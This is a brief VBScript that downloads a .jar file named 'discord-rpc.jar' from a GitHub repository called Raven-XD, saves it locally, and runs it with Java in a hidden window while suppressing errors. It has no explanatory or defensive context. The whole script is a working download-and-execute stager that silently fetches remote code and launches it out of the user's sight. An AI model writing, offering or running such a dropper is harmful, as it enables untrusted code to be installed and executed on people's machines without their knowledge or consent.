Set shell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Set the URL of the .jar file
JAR_URL = "https://github.com/L1shed/Raven-XD/raw/refs/heads/master/libraries/discord-rpc.jar"
' Set the name of the downloaded .jar file
JAR_FILE = "discord-rpc.jar"

' Download the .jar file
On Error Resume Next
objHTTP.Open "GET", JAR_URL, False
objHTTP.Send

If objHTTP.Status = 200 Then
    ' Save the file
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile JAR_FILE, 2 ' Overwrite if exists
    objStream.Close

    ' Run the jar file
    shell.Run "java -jar " & JAR_FILE, 0, False
Else
    WScript.Echo "Error downloading the file: " & objHTTP.Status
End If
